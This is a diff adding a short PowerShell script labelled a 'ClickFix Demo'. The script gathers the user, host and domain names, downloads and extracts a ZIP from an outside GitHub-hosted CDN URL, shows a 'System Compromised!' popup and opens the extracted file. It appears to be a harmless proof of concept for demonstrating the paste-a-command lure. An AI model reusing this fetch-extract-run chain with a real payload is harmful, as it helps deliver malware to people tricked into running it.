@@ -1,0 +1,16 @@
+Add-Type -AssemblyName System.Windows.Forms
+# Gather system info
+$user = whoami
+$host_name = hostname
+$domain = (Get-WmiObject Win32_ComputerSystem).Domain
+# Download and extract ZIP
+$url = "https://cdn.jsdelivr.net/gh/olympusmons5143/test@main/demo2.zip"
+$dest = "$env:TEMP\demo.zip"
+$extract = "$env:TEMP\demo"
+Invoke-WebRequest -Uri $url -OutFile $dest
+Expand-Archive -Path $dest -DestinationPath $extract -Force
+# Show popup with system info
+$info = "System Compromised!`n`nUser: $user`nHost: $host_name`nDomain: $domain`n`nPayload extracted to: $extract"
+[System.Windows.Forms.MessageBox]::Show($info, "ClickFix Demo", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+# Open extracted file
+Start-Process "$extract\demo2.txt"
